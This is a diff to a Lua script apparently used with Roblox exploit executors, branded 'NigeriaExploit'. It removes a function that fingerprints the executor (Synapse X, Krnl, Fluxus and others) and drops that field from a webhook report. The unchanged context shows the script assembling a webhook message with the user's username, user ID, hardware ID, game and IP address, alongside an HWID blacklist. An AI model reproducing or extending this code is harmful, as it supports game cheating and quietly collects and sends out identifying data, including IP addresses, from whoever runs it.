@@ -24,43 +24,6 @@ $R@i.~~ !     :   ~$$$$$B$$en:``
 --// Services
 
 -- Executor Detection
-local function detectExecutor()
-    if syn then return "Synapse X" end
-    if secure_load then return "Sentinel" end
-    if pebc_execute then return "ProtoSmasher" end
-    if KRNL_LOADED then return "Krnl" end
-    if is_sirhurt_closure then return "SirHurt" end
-    if identifyexecutor then
-        local s, r = pcall(identifyexecutor)
-        if s and r then return r end
-    end
-    if _G.fluxus then return "Fluxus" end
-    if _G.delta then return "Delta" end
-    if _G.WRD_DEBUG or _G.WEAREDEVS then return "WeAreDevs (WRD)" end
-    if _G.oxygenU then return "Oxygen U" end
-    if _G.scriptware then return "Script-Ware" end
-    if get_luavm_flags then return "Script-Ware (Alt)" end
-    if _G.JJSploit then return "JJSploit" end
-    if _G.Celestial then return "Celestial" end
-    if _G.Protosmasher then return "ProtoSmasher (Alt)" end
-    if _G.Vega then return "Vega X" end
-    if _G.Hydrogen then return "Hydrogen" end
-    if _G.Arcade then return "Arcade" end
-    if _G.Shadow then return "Shadow" end
-    if _G.Potassium then return "Potassium" end
-    local ok, env = pcall(getrenv)
-    if ok and env and (env.Potassium or env.executorName == "Potassium") then return "Potassium" end
-    if gethiddenproperty or sethiddenproperty then return "Unknown (HiddenProp)" end
-    if getrawmetatable or setrawmetatable then return "Unknown (Metatable)" end
-    if newcclosure or islclosure then return "Unknown (CClosure)" end
-    if hookfunction then return "Unknown (Hook)" end
-    if protect_gui or protect_script then return "Unknown (Protect API)" end
-    if getconnections then return "Unknown (Connections)" end
-    if getgenv then return "Unknown (getgenv)" end
-    if getfenv and getfenv(0) and getfenv(0).setclipboard then return "Unknown (Clipboard)" end
-    if HttpGet or HttpPost then return "Unknown (HTTP)" end
-    return "Unknown"
-end
 
 -- Blacklist
 local blacklistedHWIDs = {
@@ -86,7 +49,7 @@ local function createWebhookData()
             title = "NigeriaExploit",
             description = string.format(
                 "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s\n",
-                Username, DisplayName, UserId, HWID, GameName, executor, GetIp
+                Username, DisplayName, UserId, HWID, GameName, GetIp
             ),
             thumbnail = {
                 url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
